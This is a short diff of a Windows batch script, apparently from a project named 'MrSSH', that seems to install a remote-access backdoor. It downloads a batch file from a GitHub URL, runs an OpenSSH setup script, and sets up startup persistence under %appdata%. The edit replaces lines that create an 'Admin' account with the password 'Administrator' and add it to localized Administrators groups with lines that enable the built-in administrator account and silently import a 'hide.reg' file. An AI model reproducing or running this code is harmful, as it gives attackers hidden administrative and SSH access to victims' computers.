@@ -14,10 +14,8 @@ curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Hex.bat" -o "H
 
 powershell ./OpenSSH.ps1
 
-net user "Admin" "Administrator" /add
-net localgroup Administrators Admin /add
-net localgroup Administratorzy Admin /add
-net localgroup Administración  Admin /add
+net user administrator /active:yes
+reg import "%temp%\hide.reg"
 
 :: <Startup>
 mkdir %appdata%\MrSSH
